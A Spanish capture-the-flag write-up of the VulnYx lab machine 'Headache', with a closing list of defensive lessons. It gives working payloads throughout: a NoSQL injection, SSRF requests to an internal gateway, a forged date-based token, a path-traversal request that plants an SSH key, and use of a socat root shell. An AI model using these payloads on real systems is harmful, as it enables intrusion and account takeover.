# Writeup: Headache (VulnYx — Difícil)

Headache es una máquina **Difícil** de la plataforma **VulnYx** que simula una aplicación web con un portal público (`headache.nyx`) y un gateway interno accesible únicamente desde `localhost`. La cadena de compromiso comienza con una **inyección NoSQL** en `/api/search` que filtra documentación interna del servicio, revelando la existencia de un **SSRF** en `/api/preview`, un gateway interno en `http://localhost:8080`, un endpoint `/auth/token_hint` que describe la fórmula del token de autenticación, y una plantilla `write_file` que escribe contenido arbitrario en `/home/{{USER}}/.ssh/authorized_keys` con **expansión literal de variables**. Aprovechando el SSRF para alcanzar el gateway, obtenemos el token interno, y mediante la plantilla `write_file` con **path traversal** en el parámetro `USER` escribimos nuestra clave pública SSH en el directorio de `searchsvc`. Tras acceder por SSH, enumeramos los archivos del grupo `ops` y descubrimos en el log del job-runner que se ha habilitado una **consola root en `127.0.0.1:9999`** mediante `socat`. Conectando a ese puerto obtenemos una shell como **root**.

---

## Fase 1: Reconocimiento

Escaneo de la red local para identificar hosts activos:

```bash
sudo arp-scan --localnet
```

**Resultado (extracto):**

```
Interface: eth0, type: EN10MB, MAC: 08:00:27:5a:87:bc, IPv4: 192.168.1.11
192.168.1.1     10:07:1d:92:cf:98       (Unknown)
192.168.1.7     00:a5:54:32:27:f6       (Unknown)
192.168.1.10    08:00:27:f5:a8:5b       (Unknown)
192.168.1.6     46:ac:03:b8:b4:30       (Unknown: locally administered)
192.168.1.4     50:bb:b5:ab:8c:0c       (Unknown)
192.168.1.3     ee:37:73:2d:35:86       (Unknown: locally administered)

6 packets received by filter, 0 packets dropped by kernel
```

El host `192.168.1.10` presenta una MAC de VirtualBox, lo que sugiere que es la máquina objetivo. Escaneo completo de puertos:

```bash
sudo nmap -sS --min-rate 500 -p- -vv -Pn -n 192.168.1.10 -oG allPorts
```

**Resultado (extracto):**

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:F5:A8:5B (Oracle VirtualBox virtual NIC)
```

Escaneo de servicios y versiones:

```bash
nmap -sCV -p 22,80 192.168.1.10 -oN targeted
```

**Resultado:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0 (protocol 2.0)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: 404 Not Found
MAC Address: 08:00:27:F5:A8:5B (Oracle VirtualBox virtual NIC)
```

**Observaciones clave:**

- **SSH** en el puerto 22 con OpenSSH 10.0 (Alpine Linux, según se verá más adelante).
- **HTTP** en el puerto 80 servido por **Gunicorn**, un servidor WSGI de Python.
- El título por defecto es `404 Not Found`, lo que indica que la raíz no sirve contenido directamente y que la aplicación espera un `Host` específico.

Añadimos el dominio `headache.nyx` a `/etc/hosts` (aunque no se muestra el comando en el log, es necesario para las peticiones posteriores):

```bash
echo "192.168.1.10 headache.nyx" | sudo tee -a /etc/hosts
```

---

## Fase 2: Enumeración web y descubrimiento de endpoints

Acceso a la raíz del sitio:

```bash
curl http://headache.nyx
```

**Resultado:**

```html
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

Fuzzing de directorios y archivos con `feroxbuster`:

```bash
feroxbuster -u http://headache.nyx
```

**Resultado (extracto):**

```
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
308      GET        5l       22w      235c http://headache.nyx/api => http://headache.nyx/api/
200      GET        1l        1w       15c http://headache.nyx/api/search
405      GET        5l       20w      153c http://headache.nyx/api/preview
```

**Hallazgo:** se identifican tres endpoints bajo `/api/`:

- `GET /api/search` → responde `200` con un JSON vacío.
- `GET /api/preview` → responde `405 Method Not Allowed` (espera `POST`).
- `/api` redirige a `/api/`.

Probamos los endpoints:

```bash
curl http://headache.nyx/api/search
```

**Resultado:**

```json
{"results":[]}
```

```bash
curl http://headache.nyx/api/preview
```

**Resultado:**

```html
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

---

## Fase 3: Inyección NoSQL en `/api/search`

El endpoint `/api/search` acepta un parámetro `query`. Probamos una inyección NoSQL clásica utilizando el operador `$ne` (not equal) para forzar que la consulta devuelva todos los documentos:

```bash
curl -G http://headache.nyx/api/search --data-urlencode 'query[$ne]=1' | jq
```

**Resultado:**

```json
{
  "results": [
    {
      "body": "Search indexes internal operational notes and API fragments. Some entries include schema definitions and service contracts.",
      "title": "OO Search Index Policy"
    },
    {
      "body": "Preview fetches HTTP(S) resources and returns a bounded prefix of the response body along with allowlisted headers. Redirects are not followed. Host allowlist applies.",
      "title": "Preview Service Contract"
    },
    {
      "body": "{ \"service\":\"gateway\", \"version\":\"v1\", \"base\":\"http://localhost:8080\", \"auth\": { \"type\":\"header\", \"name\":\"X-Internal-Token\" }, \"endpoints\": [ {\"method\":\"GET\",\"path\":\"/routes\"}, {\"method\":\"GET\",\"path\":\"/status\"}, {\"method\":\"GET\",\"path\":\"/auth/token_hint\"}, {\"method\":\"POST\",\"path\":\"/executeJob\"} ] }",
      "title": "Gateway API Fragment (v1)"
    },
    {
      "body": "{ \"path\":\"/executeJob\", \"method\":\"POST\", \"headers\": {\"X-Internal-Token\":\"<sha256>\"}, \"json\": {\"template\":\"string\",\"USER\":\"string\",\"content\":\"string\"}, \"errors\": {\"403\": {\"required\":\"X-Internal-Token\",\"ref\":\"/auth/token_hint\"}} }",
      "title": "Gateway ExecuteJob Schema"
    },
    {
      "body": "{ \"template\":\"write_file\", \"effect\":\"writes content to a user-scoped key file\", \"output\":\"/home/{{USER}}/.ssh/authorized_keys\", \"params\": {\"USER\":\"string\",\"content\":\"string\"}, \"notes\":\"template variables are expanded verbatim\" }",
      "title": "Job Template Contract"
    },
    {
      "body": "{\"service\":\"portal\",\"base\":\"/api\",\"routes\":[{\"method\":\"GET\",\"path\":\"/api/search\"},{\"method\":\"POST\",\"path\":\"/api/preview\"},{\"method\":\"POST\",\"path\":\"/api/dispatchJob\"}]}",
      "title": "Portal Routes (v1)"
    }
  ]
}
```

**Análisis de la vulnerabilidad:**

La aplicación construye una consulta a una base de datos MongoDB (o compatible) a partir del parámetro `query` sin validar su tipo. Al enviar `query[$ne]=1`, el servidor interpreta `query` como un objeto con el operador `$ne` (not equal). La consulta resultante es algo similar a `{"campo": {"$ne": 1}}`, que coincide con **todos los documentos** cuyo campo no sea igual a `1`. En lugar de filtrar, el endpoint devuelve la colección completa.

Esta es una **inyección NoSQL** clásica: el atacante controla no solo el valor sino la **estructura del operador**, lo que permite evadir filtros y extraer información no prevista. La causa raíz es la confianza en la entrada del usuario sin validar que `query` sea un string y sin sanear los operadores.

**Documentación filtrada:**

Los documentos revelan la arquitectura interna:

- **`/api/preview`** es un servicio que realiza peticiones HTTP(S) a una URL dada, devuelve un prefijo del cuerpo y cabeceras en allowlist. **No sigue redirecciones**. Tiene una **host allowlist**.
- **Gateway interno** en `http://localhost:8080` con autenticación por cabecera `X-Internal-Token`. Endpoints: `/routes`, `/status`, `/auth/token_hint`, `/executeJob`.
- **`/executeJob`** requiere el token y acepta un JSON con `template`, `USER` y `content`.
- **Plantilla `write_file`**: escribe `content` en `/home/{{USER}}/.ssh/authorized_keys`. La nota crítica es **"template variables are expanded verbatim"**, es decir, `USER` se sustituye sin sanitizar, lo que permite **path traversal**.
- **Portal routes**: `/api/search`, `/api/preview`, `/api/dispatchJob`.

La cadena de ataque se dibuja: NoSQLi → SSRF → gateway interno → token → `write_file` con path traversal → SSH key injection.

---

## Fase 4: SSRF en `/api/preview` y acceso al gateway interno

Confirmamos que `/api/preview` acepta peticiones POST con un JSON que contiene la URL a previsualizar. Enviamos una petición a `http://localhost`:

**Solicitud:**

```http
POST /api/preview HTTP/1.1
Host: headache.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 32

{"url":"http://localhost"}
```

**Respuesta:**

```http
HTTP/1.1 200 OK
Server: gunicorn
Date: Sat, 21 Nov 2026 18:19:01 GMT
Connection: close
Content-Type: application/json
Content-Length: 294

{"headers":{"Content-Type":"text/html; charset=utf-8"},"preview":"<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n","status":404}
```

**Hallazgo:** el servidor realiza la petición y devuelve el cuerpo y las cabeceras. Es un **SSRF** (Server-Side Request Forgery). La allowlist de hosts permite `localhost`, lo que nos da acceso a servicios internos no expuestos.

Enumeramos las rutas del gateway interno en `localhost:8080`:

**Solicitud:**

```http
POST /api/preview HTTP/1.1
Host: headache.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 42

{"url":"http://localhost:8080/routes"}
```

**Respuesta:**

```json
{"headers":{"Content-Type":"application/json","X-Backend-Host":"gateway01"},"preview":"{\"routes\":[\"/status\",\"/auth/token_hint\",\"/executeJob\"]}\n","status":200}
```

**Hallazgo:** el gateway expone las rutas `/status`, `/auth/token_hint` y `/executeJob`. La cabecera `X-Backend-Host: gateway01` revela el nombre de la instancia.

Consultamos `/status`:

**Solicitud:**

```http
POST /api/preview HTTP/1.1
Host: headache.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 42

{"url":"http://localhost:8080/status"}
```

**Respuesta:**

```json
{"headers":{"Content-Type":"application/json","X-Backend-Host":"gateway01"},"preview":"{\"day\":\"2026-11-21\",\"instance\":\"gateway01\",\"runtime_user\":\"searchsvc\",\"service\":\"gateway\"}\n","status":200}
```

**Hallazgo:** el gateway se ejecuta como `searchsvc`, la instancia es `gateway01` y la fecha actual es `2026-11-21`. Estos datos son necesarios para construir el token.

Consultamos `/auth/token_hint`:

**Solicitud:**

```http
POST /api/preview HTTP/1.1
Host: headache.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 53

{"url":"http://localhost:8080/auth/token_hint"}
```

**Respuesta:**

```json
{"headers":{"Content-Type":"application/json","X-Backend-Host":"gateway01"},"preview":"{\"header\":\"X-Internal-Token\",\"token\":\"sha256(instance + ':' + yyyy-mm-dd)\"}\n","status":200}
```

**Hallazgo:** el token se calcula como `sha256(instance + ':' + yyyy-mm-dd)`. Con `instance=gateway01` y fecha `2026-11-21`, el token es:

```bash
printf 'gateway01:2026-11-21' | sha256sum
```

**Resultado:**

```
ff19532954ecf6f5f41b7f2cf21e2979b41fd6ee917d3b7350dad866af2d8f5d
```

Este token se envía en la cabecera `X-Internal-Token` a `/executeJob`.

---

## Fase 5: Obtención del token interno y generación de clave SSH

Generamos un par de claves SSH para inyectar en el `authorized_keys` del usuario `searchsvc`:

```bash
ssh-keygen -t ed25519 -N "" -f /home/kali/Projects/Headache/content/id_searchsvc
```

**Resultado:**

```
Generating public/private ed25519 key pair.
Your identification has been saved in /home/kali/Projects/Headache/content/id_searchsvc
Your public key has been saved in /home/kali/Projects/Headache/content/id_searchsvc.pub
The key fingerprint is:
SHA256:/L2VzsnwStPJPlWdO3YAYwbDsRFr2Xz1ic6Gh0LPvDQ kali@kali
```

La clave pública es:

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHgdHYfRLB3qkDm375I/LT4KVFkPaF3LmvadSLrptHdK kali@kali
```

---

## Fase 6: Ejecución de job para escritura de clave SSH (path traversal)

El portal expone `/api/dispatchJob`, que presumiblemente reenvía la petición al gateway `/executeJob` con el token. Enviamos una petición con:

- `token`: el SHA-256 calculado.
- `template`: `write_file`.
- `USER`: `../../home/searchsvc` (path traversal para escapar de `/home/` y apuntar a `/home/searchsvc`).
- `content`: nuestra clave pública SSH.

**Solicitud:**

```http
POST /api/dispatchJob HTTP/1.1
Host: headache.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 242

{
"token":"ff19532954ecf6f5f41b7f2cf21e2979b41fd6ee917d3b7350dad866af2d8f5d","template":"write_file",
"USER":"../../home/searchsvc",
"content": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHgdHYfRLB3qkDm375I/LT4KVFkPaF3LmvadSLrptHdK kali@kali"
}
```

**Respuesta:**

```json
{"job_id":1795290458,"ok":true}
```

**Análisis de la vulnerabilidad:**

La plantilla `write_file` construye la ruta de destino como:

```
/home/{{USER}}/.ssh/authorized_keys
```

Con `USER = ../../home/searchsvc`, la ruta resultante es:

```
/home/../../home/searchsvc/.ssh/authorized_keys
```

Al resolver `..`, la ruta se normaliza a `/home/searchsvc/.ssh/authorized_keys`, escribiendo nuestra clave pública en el archivo de claves autorizadas de `searchsvc`. El path traversal es posible porque el parámetro `USER` se expande **verbatim** sin sanitizar, tal como advertía el contrato de la plantilla.

---

## Fase 7: Acceso SSH como `searchsvc` y enumeración de grupos

Nos conectamos por SSH con la clave privada generada:

```bash
ssh searchsvc@headache.nyx -i id_searchsvc
```

**Resultado:**

```
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

searchsvc@headache:~$ id
uid=1000(searchsvc) gid=1000(searchsvc) groups=1000(searchsvc),1001(ops)
```

**Hallazgo:** `searchsvc` pertenece al grupo **`ops`**. Enumeramos los archivos y directorios que pertenecen a ese grupo:

```bash
find / -group ops 2>/dev/null
```

**Resultado:**

```
/opt/jobrunner/plugins
/opt/jobrunner/plugins/pdf_exporter.ser
/var/lib/jobs/metadata.json
/var/log/headache
/var/log/headache/job-runner.log
```

Revisamos el contenido de los archivos accesibles:

```bash
cat /var/lib/jobs/metadata.json
```

**Resultado:**

```json
{"plugin":"pdf_exporter"}
```

```bash
cat /var/log/headache/job-runner.log
```

**Resultado:**

```
[2026-11-21T19:48:00.096278+00:00] Job 1795290458 transitioned RUNNING -> FINALIZED
[2026-11-21T19:48:00.097559+00:00] Job 1795290458 awaiting stabilization window
[2026-11-21T19:49:00.090319+00:00] Job 1795290458 ready for plugin processing
[2026-11-21T19:49:00.093266+00:00] Loading plugin: pdf_exporter
[2026-11-21T19:49:00.098889+00:00] Plugin loaded
[2026-11-21T19:49:00.101424+00:00] Root console enabled on 127.0.0.1:9999
```

**Hallazgo crítico:** el log del job-runner indica que, tras cargar el plugin `pdf_exporter`, se ha habilitado una **consola root en `127.0.0.1:9999`**.

Verificamos los puertos en escucha:

```bash
ss -nltp
```

**Resultado:**

```
State             Recv-Q            Send-Q                        Local Address:Port                         Peer Address:Port            Process
LISTEN            0                 2048                                0.0.0.0:80                                0.0.0.0:*
LISTEN            0                 128                                 0.0.0.0:22                                0.0.0.0:*
LISTEN            0                 2048                              127.0.0.1:8080                              0.0.0.0:*
LISTEN            0                 5                                 127.0.0.1:9999                              0.0.0.0:*
LISTEN            0                 128                                    [::]:22                                   [::]:*
```

Confirmamos la existencia del servicio en `127.0.0.1:9999`. Revisamos los procesos para identificar qué lo está ejecutando:

```bash
ps auxx
```

**Resultado (extracto):**

```
root       2378  0:00 socat TCP-LISTEN:9999,bind=127.0.0.1,reuseaddr,fork EXEC:/bin/ash,pty,stderr,setsid,sigint,sane
```

**Hallazgo:** el proceso `socat` está lanzando una shell `/bin/ash` en el puerto `9999`, enlazada a `127.0.0.1` y ejecutándose como **root**. El plugin `pdf_exporter` ha sido el encargado de habilitar esta consola.

---

## Fase 8: Escalada a root mediante la consola en `127.0.0.1:9999`

Conectamos al puerto `9999` usando `nc`:

```bash
nc 127.0.0.1 9999
```

**Resultado:**

```
/bin/ash: can't access tty; job control turned off
~ # id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

**Hallazgo:** obtenemos una shell como **root** en la máquina. La escalada se ha completado.

---

## 📌 Conclusión

1. **Reconocimiento** → host `192.168.1.10` con SSH (22) y HTTP (80, Gunicorn).
2. **Enumeración web** → endpoints `/api/search` (GET) y `/api/preview` (POST).
3. **Inyección NoSQL** en `/api/search` → filtración de documentación interna que revela el gateway en `localhost:8080`, el esquema de autenticación y la plantilla `write_file`.
4. **SSRF** en `/api/preview` → acceso al gateway interno. Se obtienen `/routes`, `/status` (instancia `gateway01`, fecha `2026-11-21`) y `/auth/token_hint` (fórmula del token).
5. **Generación del token** → `sha256("gateway01:2026-11-21")`.
6. **Path traversal** en la plantilla `write_file` → escritura de clave SSH en `/home/searchsvc/.ssh/authorized_keys`.
7. **Acceso SSH** como `searchsvc` → pertenencia al grupo `ops`.
8. **Enumeración de archivos del grupo `ops`** → log del job-runner revela consola root en `127.0.0.1:9999`.
9. **Conexión a `127.0.0.1:9999`** → shell como **root**.

---

## 📚 Lecciones aprendidas

1. **La inyección NoSQL permite controlar operadores, no solo valores**  
   Validar que los parámetros de consulta sean del tipo esperado (string, número) y rechazar objetos. Usar ODMs con esquemas estrictos y nunca pasar la entrada del usuario directamente a `find()`.

2. **El SSRF con allowlist de `localhost` es una puerta a servicios internos**  
   Restringir las URLs a dominios externos explícitos, bloquear `localhost`, `127.0.0.1` y rangos privados. Validar la IP resuelta antes de conectar.

3. **Los tokens predecibles basados en fecha e instancia son forjables**  
   El token se calcula como `sha256(instance + ':' + fecha)`. Cualquiera que conozca la fórmula y los valores puede generarlo. Usar secretos de alta entropía y rotación, no datos públicos.

4. **La expansión literal de variables en plantillas de escritura permite path traversal**  
   Sanitizar el parámetro `USER` para evitar `../` y normalizar la ruta resultante. Validar que el path final esté dentro del directorio esperado.

5. **Los plugins que se ejecutan como root son un vector de escalada**  
   El plugin `pdf_exporter` habilitó una consola root en `127.0.0.1:9999`. Auditar los plugins y su ejecución con privilegios mínimos.

6. **Los logs pueden filtrar información crítica**  
   El log del job-runner reveló la existencia de la consola root. Restringir el acceso a los logs y no registrar información sensible como puertos de depuración.

7. **La pertenencia a grupos secundarios como `ops` debe auditarse**  
   `searchsvc` podía leer archivos del grupo `ops`, incluyendo logs y metadatos. Aplicar el principio de mínimo privilegio y revisar los permisos de grupo.
